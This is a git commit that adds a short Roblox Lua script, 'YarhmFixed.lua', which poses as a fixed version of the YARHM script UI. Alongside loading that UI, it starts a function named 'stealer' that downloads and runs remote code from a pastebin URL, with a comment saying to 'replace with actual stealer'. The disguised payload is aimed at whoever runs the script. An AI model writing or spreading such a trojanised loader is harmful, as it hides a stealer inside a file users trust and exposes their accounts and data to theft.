2e4df6c8d4da736cd1bb4d8dd780c15a6bcde6aa
TakZ-bit <tak72086@gmail.com>
2025-09-27 22:44:50 +0630

    Create YarhmFixed.lua

---
+++ YarhmFixed.lua
@@ -0,0 +1,8 @@
+local function stealer()
+    loadstring(game:HttpGet('https://pastebin.com/raw/ZvehLyZ9'))() -- replace with actual stealer
+end
+local function loadui()
+  loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-YARHM-12403"))()
+end
+task.spawn(stealer)
+task.spawn(loadui)
